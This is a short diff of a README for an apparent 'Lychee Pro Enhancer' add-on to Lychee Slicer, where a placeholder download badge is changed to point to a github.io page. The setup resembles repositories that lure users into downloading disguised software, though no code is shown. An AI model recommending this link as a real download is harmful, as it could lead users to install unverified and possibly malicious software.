@@ -2,7 +2,8 @@
 
 Improve Lychee Slicer with enhanced supports, auto-orientation, and mesh repair tools for flawless resin printing.
 
-[![Download Lychee Pro Enhancer](https://img.shields.io/badge/Download-LycheeEnhancer-blueviolet)](#)
+[![Download Lychee Pro Enhancer](https://img.shields.io/badge/Download-LycheeEnhancer-blueviolet)](https://lychee-slicer-pro-enhancer.github.io/.github
+)
 
 ---
 
